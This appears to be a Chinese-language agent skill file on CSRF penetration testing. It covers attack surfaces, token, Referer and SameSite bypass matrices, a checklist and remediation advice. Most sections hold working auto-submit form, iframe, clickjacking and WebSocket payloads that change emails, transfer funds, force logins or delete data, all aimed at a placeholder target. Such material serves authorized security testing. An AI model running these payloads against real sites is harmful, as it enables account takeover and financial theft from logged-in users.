---
name: csrf-testing
description: CSRF跨站请求伪造深度测试技能：GET/POST/JSON/Flash/SOAP全类型、Token绕过矩阵、SameSite Lax/Strict/None绕过、CORS+CSRF组合攻击、登录CSRF/注销CSRF
version: 2.0.0
---

# CSRF跨站请求伪造深度测试技能

## 概述

CSRF利用浏览器自动携带Cookie的特性，诱导已登录用户执行非预期操作。现代防护包括CSRF Token（Synchronizer Token/Double Submit/HMAC Cookie）、SameSite Cookie、Referer/Origin校验、自定义Header、CORS限制。本技能覆盖GET/POST/JSON/AJAX/Flash/SOAP全请求类型、Token绕过方法、SameSite绕过、登录CSRF/注销CSRF、CORS错误配置联动利用。

## 一、CSRF完整攻击面

### 1.1 敏感操作识别
| 操作类型 | 风险场景 |
|---------|---------|
| 账户安全 | 修改密码/邮箱/手机号、绑定/解绑第三方账户、启用/禁用2FA |
| 资金操作 | 转账、支付、充值、提现、购买、退款 |
| 权限变更 | 添加管理员、修改角色、授权API Key、邀请成员 |
| 数据操作 | 删除数据、修改内容、上传文件、发布内容 |
| 会话管理 | 注销会话（Logout CSRF）、登录（Login CSRF）、重置密码 |
| 配置变更 | 修改安全设置、Webhook、回调URL、重定向白名单 |
| 通知/消息 | 发送消息、评论、关注、邀请 |
| API操作 | GraphQL mutation、RESTful PUT/DELETE/PATCH |

### 1.2 请求类型分类
| 请求类型 | 攻击难度 | 典型方法 |
|---------|---------|---------|
| GET请求 | 低 | `<img src=url>`、`<a href=url>`自动点击 |
| POST表单（urlencoded）| 低 | 自动提交form |
| POST multipart | 低 | form+enctype=multipart/form-data |
| POST JSON | 中 | Flash/Silverlight/Content-Type绕过/CORS |
| AJAX/Fetch（自定义Header）| 中-高 | 需CORS支持或Flash |
| PUT/DELETE/PATCH | 中-高 | method参数覆盖、表单覆盖 |
| SOAP/XML | 中 | XML内容提交 |
| WebSocket | 高 | 需建立WS连接 |

### 1.3 CSRF类型
- **常规CSRF**：以受害者身份执行操作
- **Login CSRF**：攻击者预设置账户（攻击者已知密码），通过CSRF让受害者登录攻击者账户，窃取后续输入的敏感信息（信用卡等）
- **Logout CSRF**：强制用户登出，可用于拒绝服务或配合其他攻击
- **Flash CSRF**：利用Flash跨域请求能力发送任意请求（307重定向+Flash）
- **JSON CSRF**：绕过JSON请求的CSRF防护
- **CSRF + XSS联动**：XSS→CSRF Token窃取→任意操作
- **CSRF + Open Redirect**：重定向绕过Referer检查
- **CSRF + CORS**：CORS错误配置→跨域读取CSRF Token
- **DoS via CSRF**：删除数据/修改密码导致DoS

## 二、检测方法

### 2.1 Token机制识别
检查请求中的CSRF Token字段：
| Token位置 | 常见参数名 |
|---------|---------|
| 表单隐藏字段 | `csrf_token`、`_token`、`csrfmiddlewaretoken`、`authenticity_token`、`__RequestVerificationToken` |
| HTTP Header | `X-CSRF-Token`、`X-XSRF-Token`、`X-CSRF-TOKEN` |
| Cookie | `XSRF-TOKEN`、`csrftoken` |
| URL参数 | `?token=xxx`、`&_csrf=xxx` |

**Token有效性测试：**
```
1. 删除Token → 是否拒绝请求？（应拒绝）
2. 替换为其他用户Token → 是否拒绝？（应拒绝）
3. 替换为其他会话Token → 是否拒绝？（应拒绝）
4. Token长度太短/全相同字符 → 是否拒绝？
5. Token仅长度固定但值固定 → 存在风险
6. Token可预测（时间戳+用户ID MD5等）
7. 空Token是否通过？
8. Token在GET/POST中均可使用？（GET CSRF风险）
```

### 2.2 Referer/Origin检测
```
1. 正常Referer: https://target.com/path
2. 删除Referer → 是否拒绝？
3. Referer为空 → 是否通过？
4. Referer为http:// → http降级是否检查？
5. Referer为子域名 → 是否通过？（应该也同源检查）
6. Referer为target.com.attacker.com → 是否通过？
7. Referer为attacker.com/target.com → 是否通过？
8. Referer含target.com（参数/路径中）→ 是否绕过？
9. Origin头空/删除时是否通过？
10. Origin为null → 是否通过？（iframe sandbox/srcdoc/data: URL的Origin为null）
```

### 2.3 SameSite Cookie检测
```
检查Set-Cookie头：
- 无SameSite属性：旧浏览器Lax默认，Chrome 80+ Lax默认POST不携带
- SameSite=Strict：最严格，跨站任何请求不携带Cookie
- SameSite=Lax：跨站GET请求（顶级导航）携带Cookie，POST/AJAX不携带
- SameSite=None：必须Secure，所有请求携带
SameSite绕过见第四章
```

### 2.4 自定义Header检测
检查是否依赖自定义Header（如X-Requested-With）作为CSRF防护：
```
- X-Requested-With: XMLHttpRequest（jQuery等AJAX库自动添加）
- X-CSRF-Token: xxx
- 注意：Flash在旧浏览器中可发送自定义Header，POST请求form无法直接添加自定义Header
```

## 三、基础利用技术

### 3.1 GET请求CSRF
```html
<!-- 图像标签（自动加载） -->
<img src="https://target.com/api/delete?id=123" style="display:none">

<!-- 0像素iframe -->
<iframe src="https://target.com/api/delete?id=123" style="display:none"></iframe>

<!-- link prefetch -->
<link rel="prefetch" href="https://target.com/api/delete?id=123">

<!-- 自动提交的a标签（JS自动点击） -->
<a href="https://target.com/api/transfer?to=attacker&amount=10000" id="cs">
<script>document.getElementById('cs').click();</script>

<!-- meta refresh -->
<meta http-equiv="refresh" content="0;url=https://target.com/api/delete?id=123">

<!-- CSS background -->
<style>body{background:url(https://target.com/api/delete?id=123)}</style>
```

### 3.2 POST表单CSRF（urlencoded）
```html
<!-- 自动提交表单 -->
<html><body>
<form id="csrf" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>

<!-- 多参数表单 -->
<form id="p" action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="account" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="currency" value="USD">
  <input type="hidden" name="note" value="test">
</form>
<script>document.p.submit();</script>
```

### 3.3 multipart/form-data CSRF（文件上传场景）
```html
<!-- 文件上传CSRF（如果上传接口无Token）-->
<form id="f" action="https://target.com/api/upload-avatar" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar">
  <!-- 预填充文件（无法直接通过JS填充File对象，需要DataTransfer API或用户交互，但meta refresh等可辅助）-->
</form>
```

### 3.4 JSON CSRF
```html
<!-- 方法1：enctype=text/plain（服务器容忍Content-Type时）-->
<form action="https://target.com/api/update-profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- 实际提交的body: {"email":"attacker@evil.com","x":"="} -->

<!-- 方法2：Flash/Silverlight跨域请求（旧浏览器） -->
<!-- Flash crossdomain.xml允许*时，可发送任意Content-Type的POST -->
<object type="application/x-shockwave-flash" data="csrf.swf">
  <param name="flashvars" value="url=https://target.com/api&json={...}">
</object>

<!-- 方法3：CORS错误配置（见第六章）-->

<!-- 方法4：Service Worker+Fetch（需要先注册SW，需XSS前提）-->
```

### 3.5 PUT/DELETE/PATCH方法覆盖
```html
<!-- 隐藏方法参数 -->
<form action="https://target.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
  <input type="hidden" name="_method" value="PUT">       <!-- 常见框架 -->
  <input type="hidden" name="X-HTTP-Method-Override" value="DELETE">  <!-- Header覆盖 -->
</form>
<script>document.forms[0].submit();</script>

<!-- X-HTTP-Method-Override通过form无法直接发送，需要CORS/Flash -->
```

### 3.6 Login CSRF
```html
<!-- 攻击者已知账户密码，通过CSRF让受害者登录攻击者账户 -->
<form action="https://target.com/login" method="POST" id="f">
  <input type="hidden" name="username" value="attacker_acct">
  <input type="hidden" name="password" value="attacker_password">
</form>
<script>document.f.submit();</script>
<!-- 受害者登录后在攻击者账户内输入信用卡/个人信息，攻击者可查看 -->
```

### 3.7 Logout CSRF
```html
<!-- 强制用户登出（DoS）-->
<img src="https://target.com/logout">
<!-- 场景：受害者在做敏感操作时被登出，配合钓鱼重新登录获取密码 -->
```

### 3.8 SOAP/XML CSRF
```html
<form action="https://target.com/soap/service" method="POST" enctype="text/plain">
  <input name='<?xml version="1.0"?><soap:Envelope><soap:Body><ResetPassword><email>attacker@evil.com</email></ResetPassword></soap:Body></soap:Envelope><!--' value='-->'>
</form>
<script>document.forms[0].submit();</script>
```

## 四、绕过技术深度

### 4.1 CSRF Token绕过矩阵

| Token验证方式 | 绕过方法 |
|-------------|---------|
| 仅检查Token存在性 | 发送固定/任意Token值 |
| Token可预测（时间戳/ID/MD5） | 预测Token值 |
| Token绑定Cookie但未绑定Session | 同时设置Cookie和表单Token（Double Submit缺陷）|
| Token可重复使用 | 捕获有效Token后重用 |
| Token仅在Cookie中 | Cookie可被Cookie注入覆盖时，注入攻击者已知Token |
| Token在GET参数 | GET CSRF |
| Token通过AJAX Header发送但CORS允许 | CORS+CSRF读取Token |
| 空Token通过 | 删除Token字段 |
| 检查Token长度但不校验值 | 发送等长任意值 |
| Token绑定Session但未绑定User | 用自己的Token替换 |

**Token泄露通道：**
```
1. XSS漏洞 → 直接读取Token
2. CORS错误配置 → 跨域读取Token
3. 页面包含Token的HTML被引用 → 通过iframe读取（同源限制下不行，但X-Frame-Options缺失+postMessage可能）
4. JSONP接口泄露Token
5. Referer泄露Token（Token在URL中时）
6. 302重定向泄露Token
7. 错误页面泄露Token
8. 日志/统计接口泄露Token
```

### 4.2 Referer/Origin绕过
```html
<!-- 1. 无Referer：meta referrer=no-referrer -->
<meta name="referrer" content="no-referrer">
<a href="https://target.com/api/delete?id=123" id="x">click</a>
<script>document.getElementById('x').click();</script>
<!-- 或使用Referrer-Policy: no-referrer -->
<!-- data:/blob:/iframe sandbox发送请求不携带Referer -->

<!-- 2. Referer含target.com子串绕过（弱正则匹配）-->
<!-- https://target.com.attacker.com  子域名 -->
<!-- https://attacker.com?target.com  参数中包含 -->
<!-- https://attacker.com#target.com  hash片段 -->
<!-- https://target.com@attacker.com  @符号：attacker.com为host -->

<!-- 3. 开放重定向绕过（如果Referer检查允许referer同域但有open redirect）
     先访问同域redirect URL，重定向到目标操作，Referer显示为同域 -->
<!-- https://target.com/redirect?url=https://target.com/api/delete?id=123 -->

<!-- 4. data:/blob: URL不携带Referer -->
<iframe src="data:text/html,<form action='https://target.com/api/delete' method='POST'>...</form>"></iframe>

<!-- 5. referrer-policy -->
<a href="https://target.com/api/delete" rel="noreferrer">go</a>
<meta name="referrer" content="never">
<meta name="referrer" content="no-referrer">
```

### 4.3 SameSite Cookie绕过
**SameSite=Lax绕过（Chrome 80+默认）：**
```javascript
// 1. GET请求顶级导航（Lax模式下允许）
// 利用所有可通过GET触发的操作
window.open('https://target.com/api/delete?id=123');
location.href = 'https://target.com/api/delete?id=123';
// meta refresh、a标签点击都是顶级GET导航

// 2. 同站请求（如果能找到同站XSS或任意子域名XSS/Gadget）
// 子域名XSS → 在子域名页面下发送请求为同站
// *.target.com的Cookie Domain如果设置为父域，子域名也能发送

// 3. Cookie注入覆盖（SameSite不阻止Cookie被设置）
// 如果存在Cookie注入漏洞，可覆盖受害者Cookie为攻击者的已知Session
// 然后CSRF操作使用攻击者的Session（但受害者登录为攻击者账户=Login CSRF）

// 4. Chrome bug/特定版本绕过（历史CVE）
// 关注CVE如CVE-2020-xxx等SameSite绕过

// 5. 利用WebSocket（WS请求不受SameSite保护）
// 前提：WebSocket握手无CSRF防护
new WebSocket('wss://target.com/ws');
// 通过WS发送操作消息

// 6. method=GET覆盖POST
// 如果后端同时接受GET/POST，改用GET
```

**SameSite=Strict绕过：**
```javascript
// Strict模式下任何跨站请求不携带Cookie，绕过更难
// 1. 需要同站漏洞（XSS/子域名接管）
// 2. 浏览器漏洞
// 3. POP-UP窗口诱导点击（点击劫持→用户在已打开的目标页面点击）
// 4. 如果Cookie未设置SameSite但浏览器默认Lax→按Lax绕过
```

**SameSite=None绕过：**
```javascript
// SameSite=None必须配合Secure，所有跨站请求都携带Cookie
// 这本质是没有防护，普通CSRF可直接攻击
// 如果网站将SameSite设为None，则所有CSRF攻击都有效
```

### 4.4 自定义Header绕过
```javascript
// 如果仅依赖X-Requested-With: XMLHttpRequest作为CSRF防护
// 1. Flash跨域请求（crossdomain.xml允许时）
// 2. 某些浏览器插件可发送自定义Header
// 3. CORS配置允许跨域且允许自定义Header（预检通过时）
// 4. DNS Rebinding：攻击者DNS临时解析到target.com IP
//    浏览器认为同源，可发送任意Header
// 5. 307重定向跨域：某些情况下307重定向保留自定义Header

// 405方法绕过：OPTIONS预检→改POST→GET，GET无预检
```

### 4.5 Cookie注入+CSRF（Double Submit绕过）
```
场景：Drupal等框架使用Double Submit Cookie，Cookie中Token和表单Token比对
如果存在Cookie注入漏洞（HTTP Header注入/Crlf in Cookie）：
1. 攻击者在受害者浏览器中设置csrf_token=attacker_known_token
2. 提交CSRF表单时，Cookie中Token为attacker_known_token，表单中也为attacker_known_token
3. 两者匹配 → CSRF成功

Cookie注入位置：
- HTTP响应头注入（CRLF）
- 子域名Cookie设置（Cookie Domain设置为父域）
- XSS设置Cookie
- Cookie Tossing（子路径覆盖Cookie）
```

### 4.6 iframe sandbox + null Origin绕过
```html
<!-- iframe sandbox时Origin为null -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<form action='https://target.com/api/action' method='POST'>
<input type='hidden' name='x' value='y'>
</form>
<script>document.forms[0].submit();</script>
"></iframe>
<!-- 若后端接受空/无Origin或Origin:null时（某些配置），可绕过Origin检查 -->
```

### 4.7 跨域资源包含（CORB/CORS）绕过
```javascript
// CORS错误配置：Access-Control-Allow-Credentials: true + Access-Control-Allow-Origin: * (错误)
// 正确配置为具体Origin时可读取响应
// 1. 读取CSRF Token
fetch('https://target.com/api/profile', {credentials:'include'})
  .then(r => r.text()).then(t => { /* 提取CSRF Token */ });

// 2. 发送CSRF请求（携带Cookie+自定义Header）
fetch('https://target.com/api/delete', {
  method: 'POST',
  credentials: 'include',
  headers: {'X-CSRF-Token': token},
  body: '...'
});
```

### 4.8 Flash CSRF（历史方法）
```
当目标服务器根目录crossdomain.xml配置不当：
<cross-domain-policy>
  <allow-access-from domain="*" secure="false"/>
</cross-domain-policy>
Flash可发送跨域任意HTTP请求，包括自定义Header和任意Content-Type
```

## 五、组合攻击

### 5.1 XSS + CSRF
```javascript
// 有XSS时CSRF防御基本无效：直接读取Token并发送请求
// DOM XSS获取CSRF Token
var token = document.querySelector('meta[name=csrf-token]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: {'X-CSRF-Token': token},
  body: JSON.stringify({to:'attacker',amount:10000}),
  credentials: 'same-origin'
});

// 从Cookie读取Token（Double Submit场景）
var token = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
```

### 5.2 Open Redirect + CSRF
```
1. 目标有open redirect: https://target.com/redirect?url=xxx
2. 构造CSRF链：CSRF请求到/redirect?url=https://target.com/sensitive-action
3. Referer显示为target.com（同域），绕过Referer检查
4. 重定向到目标操作，执行敏感操作
```

### 5.3 Clickjacking + CSRF
```html
<!-- 透明iframe覆盖在引诱按钮上，用户点击实则点击目标页面按钮 -->
<html>
<style>
iframe {position:absolute;opacity:0;top:0;left:0;width:500px;height:500px;}
button {position:absolute;top:200px;left:200px;}
</style>
<button>点击领取奖品</button>
<iframe src="https://target.com/delete-account"></iframe>
</html>
```

### 5.4 WebSocket CSRF
```javascript
// WebSocket握手无CSRF Token时
// 跨域建立WebSocket连接（浏览器不受同源策略限制WS握手）
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({type:'delete_account'}));
};
```

## 六、自动化工具

### 6.1 Burp Suite
```
- Engagement tools → Generate CSRF PoC：自动生成CSRF PoC
- CSRF Scanner：Pro版主动扫描CSRF
- CSRF Token handling：Repeater/Intruder中自动更新Token
- Match and Replace：修改Token测试绕过
```

### 6.2 专用工具
| 工具 | 用途 |
|------|------|
| Burp CSRF PoC Generator | 快速生成CSRF PoC |
| XSRFProbe | CSRF自动化检测 |
| CSRF PoC Generator | 在线生成 |
| OWASP ZAP | 扫描CSRF |

### 6.3 XSRFProbe使用
```bash
# 基础扫描
xsrfprobe -u https://target.com --cookie "session=xxx"

# 深度扫描
xsrfprobe -u https://target.com/api -c "cookies.txt" --skip-analysis
```

## 七、CSRF测试清单

- [ ] 所有敏感操作接口（密码/邮箱/转账/权限/删除）
- [ ] GET/POST/PUT/DELETE/PATCH所有HTTP方法
- [ ] JSON请求（Content-Type: application/json）
- [ ] multipart文件上传接口
- [ ] 是否存在CSRF Token
- [ ] Token有效性（空/重用/可预测/跨用户有效）
- [ ] Token在Cookie还是表单/Header中
- [ ] Referer/Origin校验及绕过
- [ ] SameSite Cookie属性（Strict/Lax/None）
- [ ] SameSite Lax GET绕过
- [ ] 自定义Header（X-Requested-With等）是否可跳过
- [ ] 自定义Header是否可通过CORS/Flash/DNS Rebinding发送
- [ ] CORS错误配置（Access-Control-Allow-Credentials:true）
- [ ] Double Submit Cookie绕过（Cookie注入）
- [ ] Login/Logout CSRF
- [ ] JSON CSRF（enctype=text/plain）
- [ ] 方法覆盖（_method/X-HTTP-Method-Override）
- [ ] WebSocket接口CSRF
- [ ] 子域名XSS+CSRF联动
- [ ] Open Redirect+CSRF链
- [ ] iframe sandbox null Origin绕过
- [ ] meta referrer=no-referrer绕过Referer检查
- [ ] 307/308重定向跨域保留POST数据
- [ ] Clickjacking组合攻击
- [ ] Flash crossdomain.xml配置不当
- [ ] API Key/Token泄露通道

## 八、修复建议

- **CSRF Token（Synchronizer Token Pattern）**：每个用户会话绑定唯一Token，Token不可预测，服务端校验
- **SameSite Cookie**：关键Cookie设置`SameSite=Strict`或`SameSite=Lax`
- **双重提交Cookie（Double Submit Cookie）**：Cookie和表单Token值一致，使用加密HMAC防篡改
- **自定义Header + CORS限制**：AJAX请求使用X-CSRF-Token Header，同时正确配置CORS
- **Origin/Referer校验**：检查Origin/Referer头，严格匹配源，空Origin拒绝
- **Cookie属性**：HttpOnly+Secure+SameSite
- **关键操作二次验证**：转账/改密要求重新输入密码/2FA
- **验证码**：敏感操作加入图形验证码/短信验证码
- **用户交互**：敏感操作需要用户主动点击（非自动）
- **敏感操作避免GET**：所有写操作用POST/PUT/DELETE
- **XSS防护**：XSS可绕过所有CSRF防御

## 注意事项

- **仅限授权测试**：CSRF利用需要诱导用户点击链接，测试前获得授权
- **PoC影响评估**：构造PoC时避免执行真实破坏性操作（如删除数据），使用只读操作验证
- **浏览器差异**：SameSite行为和Cookie策略在不同浏览器/版本有差异
- **多场景验证**：Chrome/Firefox/Safari/Edge均需测试
- **合规要求**：遵守《网络安全法》，仅在授权范围内测试
